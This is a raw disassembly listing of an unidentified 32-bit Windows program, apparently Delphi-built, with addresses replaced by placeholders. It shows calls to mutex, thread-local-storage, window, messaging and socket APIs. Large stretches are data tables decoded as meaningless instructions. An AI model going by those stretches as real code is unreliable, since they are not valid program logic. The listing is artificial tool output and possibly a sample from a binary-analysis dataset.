call sub_405fa4
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
push ebx
mov eax [ ebp - 0x4 ]
call sub_405ec8
inc eax
push eax
mov eax esi
call sub_4059dc
push eax
mov eax [ ebp - 0x4 ]
call sub_405eb8
pop ecx
pop edx
call sub_40725c
test eax eax
jle r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
call sub_405d28
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_405fa4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_405d64
sub_407500
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_407543
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_405ea8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40738c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40754a
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
sub_407550
push ebx
push esi
add esp 0xfffff004
push eax
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x1000
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_405728
push 0x1000
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_406a10
push eax
call sub_401334
mov ecx eax
mov edx esp
mov eax esi
call sub_405620
jmp r-xdata
sub_4075b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_407604
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40760b
retn
mov eax rw-data
call sub_403918
mov eax rw-data
call sub_403918
mov eax rw-data
call sub_403918
call sub_402e94
mov eax rw-data
call sub_405530
sub_407644
push ebx
call sub_40763c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_407630
test eax eax
jne r-xdata
mov eax 0xe2
call sub_405470
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_405470
sub_407688
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_407644
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_4076d4
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_407610
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_4076c8
mov edx rw-data
mov eax ebx
call sub_4051dc
pop ebx
retn
sub_407754
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_407782
call [ eax + r-xdata ]
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
test [ edi + 0x40 ] dh
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
jecxz r-xdata
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
mov eax eax
add [ ebx - 0xfda0040 ] cl
jecxz r-xdata
dec ecx
jb r-xdata
jb r-xdata
je r-xdata
mov eax eax
add [ ebx - 0x13da0040 ] cl
jecxz r-xdata
sar bh 0x25
in al dx
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec ecx
ja LookupPrivilegeDisplayNameA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
mov eax eax
add [ ebx - 0x17da0040 ] cl
jecxz r-xdata
add [ ebx - 0x3da0040 ] cl
jecxz r-xdata
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
mov eax eax
add [ ebx - 0x23da0040 ] cl
jecxz r-xdata
je LookupPrivilegeValueA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae GetSidSubAuthorityCount
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
add [ ebx - 0x1bda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x7da0040 ] cl
jecxz r-xdata
mov eax eax
nop
cmp [ eax + 0x40 ] bh
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
mov eax eax
add [ ebx - 0x27da0040 ] cl
jecxz r-xdata
je r-xdata
mov eax eax
add [ ebx - 0x1fda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0xbda0040 ] cl
mov eax eax
add [ ebx - 0x2bda0040 ] cl
jecxz r-xdata
mov eax eax
add eax [ edi + esi * 2 - 0x3f74ffc0 ]
mov eax eax
add [ ebx - 0x2fda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x33da0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x37da0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x3bda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x3fda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x43da0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x47da0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x4bda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x4fda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x53da0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x57da0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x5bda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x63da0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x67da0040 ] cl
jecxz r-xdata
push eax
cmp [ ebp + 0xc ] 0x1
sbb eax eax
inc eax
add [ ebx - 0x6bda0040 ] cl
jecxz r-xdata
and eax 0x7f
push eax
mov eax [ ebp + 0x8 ]
push eax
add [ ebx - 0x6fda0040 ] cl
jecxz r-xdata
call CreateMutexA
pop ebp
retn 0xc
add [ ebx - 0x73da0040 ] cl
jecxz r-xdata
add [ eax - 0x1c87da01 ] dl
dec ecx
add [ ebx + 0x7425ffc0 ] cl
jecxz r-xdata
add [ ebx - 0x77da0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x7025ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x7bda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x6c25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x7bda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x6825ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x7fda0040 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x6425ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x7c25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x6025ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x1374aa40 ] cl
mov eax [ ebp + 0x10 ]
mov eax eax
add [ ebx + 0x5c25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x5825ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x5425ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x5025ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x4c25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x4825ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x4425ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x4025ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x3c25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x3825ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x3425ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x3025ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x3025ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x2c25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x2825ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x2425ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x2025ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x1c25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x1825ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x1425ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x1025ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0xc25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x825ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x425ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx + 0x25ffc0 ] cl
jecxz r-xdata
mov eax eax
add [ ebx - 0x3da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x7da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0xbda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0xfda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x13da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x17da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x1bda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x1fda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x23da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x27da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x2bda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x2fda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x33da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x37da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x3bda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x3fda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x43da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x47da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x4bda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x4fda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x53da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x57da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x5bda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x5fda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x63da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x67da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x6bda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x6fda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x73da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x77da0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x7bda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x7fda0040 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x7c25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x7825ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x7425ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x7025ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x6c25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x6825ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x6425ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x6025ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x5c25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x5825ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x5425ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x5025ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x4c25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x4825ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x4425ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x4025ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x3c25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x3825ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x3425ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x3025ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x2c25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x2825ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x2425ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x2025ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x1c25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x1825ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x1425ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x1025ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0xc25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x825ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x425ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx + 0x25ffc0 ] cl
loop r-xdata
mov eax eax
add [ ebx - 0x3da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x7da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0xbda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0xfda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x13da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x17da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x1bda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x1fda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x23da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x27da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x2bda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x2fda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x33da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x37da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x3bda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x3fda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x43da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x47da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x4bda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x4fda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x53da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x5bda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x5fda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x63da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x6bda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x6fda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x73da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x77da0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x7bda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x7fda0040 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x7c25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x7825ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x7425ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x7025ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x6c25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x6825ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x6425ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x6025ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x5c25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x5825ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x5425ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x5025ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x4c25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x4825ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x4425ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x4025ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x3c25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x3825ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x3425ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x3025ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x2c25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x2825ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x2425ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x2025ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x1c25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x1825ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x1425ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x1025ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0xc25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x825ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x425ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx + 0x25ffc0 ] cl
loope r-xdata
mov eax eax
add [ ebx - 0x3da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x7da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0xbda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0xfda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x13da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x17da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x1bda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x1fda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x23da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x27da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x2bda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x2fda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x33da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x37da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x3bda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x3fda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x43da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x47da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x4bda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x4fda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x53da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x57da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x5bda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x5fda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x63da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x67da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x6bda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x6fda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x73da0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x7bda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x7fda0040 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x7425ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x6825ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x6425ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x6025ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x7025ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x6c25ffc0 ] cl
loopne r-xdata
mov eax eax
jmp [ DefMDIChildProcA@IAT ]
add [ ebx + 0x7c25ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x7825ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x5c25ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x5825ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x5425ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x5025ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x4c25ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x4825ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x4425ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x4025ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x3c25ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x3825ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x3425ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x3025ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x2c25ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x2825ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x2425ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x2025ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x1c25ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x1825ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x1425ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x1025ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0xc25ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x825ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x425ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx + 0x25ffc0 ] cl
loopne r-xdata
mov eax eax
add [ ebx - 0x3da0040 ] cl
fisttp [ ecx ]
sub_407978
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
cmp [ ebp + 0xc ] 0x1
sbb eax eax
inc eax
and eax 0x7f
push eax
mov eax [ ebp + 0x8 ]
push eax
call CreateMutexA
pop ebp
retn 0xc
sub_40857c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_403418
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_403408
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_4085d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4086c9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_408707
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40870e
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_408710
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
call __WSAFDIsSet
cmp eax 0x1
sbb eax eax
inc eax
pop esi
pop ebx
retn
sub_408808
clc
ja r-xdata
stc
add al dh
inc [ eax ]
add al bh
ja r-xdata
jecxz r-xdata
add dl bh
inc [ eax ]
add al bh
ja r-xdata
cli
add cl dh
inc [ eax ]
add al bh
ja r-xdata
inc [ eax ]
add al bh
ja r-xdata
add [ eax ] al
clc
in al 0xff
add [ eax ] al
clc
add bl bh
inc [ eax ]
add al bh
ja r-xdata
sti
add dl dh
inc [ eax ]
add al bh
ja r-xdata
in eax dx
ja r-xdata
add ah ah
inc [ eax ]
add al bh
out dx al
add ch ah
inc [ eax ]
add al bh
ja r-xdata
in eax 0xff
add [ eax ] al
clc
add ah bh
inc [ eax ]
add al bh
ja r-xdata
cld
add bl dh
inc [ eax ]
add al bh
ja r-xdata
xlat
inc [ eax ]
add al bh
ja r-xdata
add dh ch
fdivr st7
add [ eax ] al
clc
add bh ch
inc [ eax ]
add al bh
ja r-xdata
out dx eax
add dh ah
inc [ eax ]
add al bh
ja r-xdata
out 0xff al
add [ eax ] al
clc
add ch bh
inc [ eax ]
add al bh
ja r-xdata
std
add ah dh
inc [ eax ]
add al bh
ja r-xdata
sar edi 0x0
ja r-xdata
add al bl
inc [ eax ]
add al bh
retn 0xff
add cl bl
inc [ eax ]
add al bh
ja r-xdata
fcos
add [ eax ] al
clc
add al dl
inc [ eax ]
add al bh
ja r-xdata
sar bh 0x1
add [ eax ] al
clc
add bh ah
inc [ eax ]
add al bh
ja r-xdata
out 0xff eax
add [ eax ] al
clc
add dh bh
inc [ eax ]
add al bh
ja r-xdata
add ch dh
inc [ eax ]
add al bh
ja r-xdata

add dl al
inc [ eax ]
add al bh
ja r-xdata
retn
add dl bl
inc [ eax ]
add al bh
ja r-xdata
add cl dl
inc [ eax ]
add al bh
ja r-xdata
sar edi 0x1
add [ eax ] al
clc
add al ch
inc [ eax ]
add al bh
ja r-xdata
call 0xfffffffff84089d0
add bh bh
inc [ eax ]
add al bh
ja r-xdata
add dh dh
inc [ eax ]
add al bh
ja r-xdata
int3
add bl al
inc [ eax ]
add al bh
ja r-xdata
add bl bl
inc [ eax ]
add al bh
ja r-xdata
add dl dl
inc [ eax ]
add al bh
ja r-xdata
sar bh cl
add [ eax ] al
clc
add cl ch
inc [ eax ]
add al bh
ja r-xdata
jmp 0xfffffffff84089d8
add al ah
loopne r-xdata
add bh dh
inc [ eax ]
add al bh
ja r-xdata
int 0xff
add [ eax ] al
clc
add ah al
inc [ eax ]
add al bh
ja r-xdata
add ah bl
inc [ eax ]
add al bh
ja r-xdata
fdiv st7
add [ eax ] al
clc
add bl dl
inc [ eax ]
add al bh
ja r-xdata
sar edi cl
add [ eax ] al
clc
add dl ch
inc [ eax ]
add al bh
ja r-xdata
0xf80000ff 0x4977
add cl ah
inc [ eax ]
add al bh
ja r-xdata
add [ eax ] al
clc
loope r-xdata
add al bh
inc [ eax ]
add al bh
ja r-xdata
